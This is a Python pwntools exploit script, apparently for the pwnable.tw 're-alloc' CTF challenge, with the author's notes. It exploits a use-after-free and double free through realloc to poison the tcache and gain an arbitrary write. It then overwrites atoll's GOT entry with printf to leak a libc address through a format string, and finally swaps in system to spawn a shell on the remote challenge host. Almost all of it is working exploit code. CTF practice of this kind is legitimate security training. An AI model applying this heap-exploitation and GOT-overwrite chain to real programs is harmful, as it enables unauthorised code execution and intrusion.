#!/usr/bin/env python3
from pwn import *
from sys import argv
"""
read size max is 0x79/121
there is no instance of malloc, just realloc
the allocate option will perform:
void* pointer = realloc(NULL, size);

which is the same as:
void* pointer = malloc(size);

it will allocate a 24 byte chunk of usable size, same as malloc
global heap object, 64 bytes in size, 8 QWORDS
also, we have the ability to use after free, 
we can realloc(heap[i], 0);
and it will free() it, and place within caching bin!
that is very interesting, i did not know that, thanks linux man pages! :DDD
so we have a use after free and a double free
i dont know if we can gain a leak? there does not seem to be any function that will write to stdout
our input is being passed to atoll in the read_long function, we can pass /bin/sh if we are able to overwrite GOT?
yea since the got.plt is within the binary right, and its writeable
okay i think i have a plan now, tcache poisoning, bypass double free key check, overwrite atoll's GOT with system?
one problem, i dont have a leak :(

okay, crazy idea
we can overwrite the GOT table right? since no pie and we have a write what where?
so, we can overwrite the atoll got entry with puts? and perform a ret2plt?
the thing is, i dont know if it will dereference our buffer as an address, or use our buffer
as the value at an address. My guess is that ret2plt will not work, since it is not actually
dereferencing my data, its just accessing the VALUE at the address, which is our input.
format string? we could overwrite with printf??? leak stack??
also, i dont know if this will break the program, what will happen to the program after atoll fails?
i will try this out now..

okay, use after free to edit free chunk, double free to as to be able to retrieve pointer that we
wrote. This leads to a write what where, we can use this to overwrite the atoll@GOT entry with printf,
and leak the values on the stack. This allows us to gain the base address of libc, which then allows
us to do anything.

options:
- overwrite atoll@GOT with system
- overwrite __free_hook?
- one gadget, overwrite hook or GOT entry, either is fine

i think the easiest, and intended route is to leak with printf, as we are only allowed 2 allocated
chunks within the heap object at a time?

1 for leak, and 1 for overwrite?

"""
binary=ELF("./re-alloc",checksec=False)
if len(argv)>1 and argv[1]=="-r":
    libc=ELF("./libc_64.so.6",checksec=False)
    p=remote("chall.pwnable.tw",10106)
#    p=remote("localhost",9999)
else:
    libc=ELF("/usr/lib/libc.so.6",checksec=False)
    p=binary.process()
chunk_sz=[(0x20+i*0x10)-8 for i in range(64)]
tcache_sz=[i+8 for i in chunk_sz]
s=lambda x,r="":p.sendlineafter(r,x)if r else p.sendline(x)
alloc=lambda idx,sz,data:(success("realloc(0, %s);",sz),s("1","choice:"),s(str(idx),":"),s(str(sz),":"),s(data,":"))
realloc=lambda idx,sz,data="":(success("realloc(heap[%s], %s);"%(idx,sz)),s("2","choice:"),s(str(idx),":"),s(str(sz),":"),s(data,":"))
free2=lambda idx:(success("realloc(heap[%s], 0);"%idx),s("2","choice:"),s(str(idx),":"),s("0",":"))
free=lambda idx:(success("free(%s);"%idx),s("3","choice:"),s(str(idx),":"))
clear_heap=lambda chunk_idx:(success("clearing heap"),realloc(0,chunk_sz[chunk_idx],"A"),free(0),realloc(1,chunk_sz[chunk_idx+1],"B"),free(1))

alloc(0,40,"A"*40)
free2(0)
realloc(0,56,p64(binary.got['atoll']))

# free in different bin as to not mess everything up
alloc(1,40,"B"*40)
free(0)
realloc(1,72,"B"*72)
free(1)

alloc(0,24,"A"*24)
free2(0)
realloc(0,72,p64(binary.got['atoll']))

# at this point, we have 2 poisoned tcache bins, as long as we alloc the correct chunk size.

alloc(1,24,"A"*24)
free(0)
realloc(1,104,"A"*104)
free(1)

# overwrite atoll@got.plt with printf
alloc(0,40,p64(binary.plt['printf']))

s("1","choice:")
s("%6$p",":")

# leak _IO_2_1_stdout_ on stack
base=int(p.recvline().strip(b"\n"),16)-libc.symbols['_IO_2_1_stdout_']
log.info("Leaked base address of libc: %s"%hex(base))

s("1","choice:")
s("",":")
s("A"*8,":")
s(p64(libc.symbols['system']+base),":")

s("1","choice:")
s("sh",":")

p.interactive()
